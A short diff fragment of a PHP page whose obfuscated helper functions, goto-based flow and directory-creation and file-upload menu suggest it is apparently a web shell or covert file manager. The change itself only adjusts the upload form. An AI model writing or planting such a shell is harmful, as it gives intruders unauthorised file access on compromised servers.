@@ -309,9 +309,9 @@ box-shadow: 0px 0px 5px #ffff00;
 <li>Add Directory : <a href="?p=<?= Ss($Jd) .
     "&a=" .
     sS("newDir") ?>" class="ohct">Submit</a></li>
-<li><form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
-<input type="file" name="f[]" multiple>
-<input type="submit" value="Upload" name="submit" class="ohct">
+<li><form method="POST" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
+<input type="file" name="f[]">
+<input type="submit" value="Submit" name="submit" class="ohct">
 <?php
 if (!isset($_FILES["f"])) {
     goto ea;
